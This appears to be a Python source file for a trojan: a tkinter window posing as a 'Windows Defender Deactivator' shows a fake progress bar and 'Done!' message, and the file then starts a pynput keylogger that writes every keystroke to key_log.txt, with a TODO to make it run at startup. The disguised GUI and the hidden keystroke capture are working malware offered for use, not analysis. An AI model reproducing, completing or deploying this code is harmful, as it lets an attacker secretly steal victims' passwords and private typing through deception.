import pynput
import logging
import time
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import showinfo

# TODO: set the program as startup

class App:

    def __init__(self, parent):
        self.root = parent
        self.notebook = ttk.Notebook(parent)
        self.notebook.pack()
        self.home = Frame(self.notebook)
        self.about = Frame(self.notebook)
        self.home.pack()
        self.about.pack()
        ttk.Label(self.home, text='Welcome to Windows Defender Deactivator').grid(row=0, column=0, pady=20)
        ttk.Label(self.about, text='Windows Defender Deactivator V0.0.1').grid(row=0, column=0, pady=20)
        self.btn = ttk.Button(self.home, text='Deactivate Windows Defender', command=self.deactivate).grid(row=1, column=0, pady=20)
        self.notebook.add(self.home, text='Home')
        self.notebook.add(self.about, text='About')
        # self.deactivate(self.home)
        
    def deactivate(self):
        toplevel = Toplevel(self.root)
        toplevel.resizable(False, False)
        pb = ttk.Progressbar(toplevel, orient='horizontal', mode='determinate', length=100)
        pb.grid(column=2, row=0, columnspan=2, padx=10, pady=20)
        while pb['value'] < 100:
            pb['value'] += 1
            time.sleep(0.02)
            root.update_idletasks()
        else:
            showinfo(message='Done!')


root = Tk()
root.resizable(False, False)
root.title('Windows Defender Deactivator')
app = App(root)
root.mainloop()



# Specify the file path where you want to store the logged keys
log_file_path = "key_log.txt"

# Configure logging to write to the specified file
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """Function to capture and log key presses."""
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Create a keyboard listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()  # Run the listener in the background


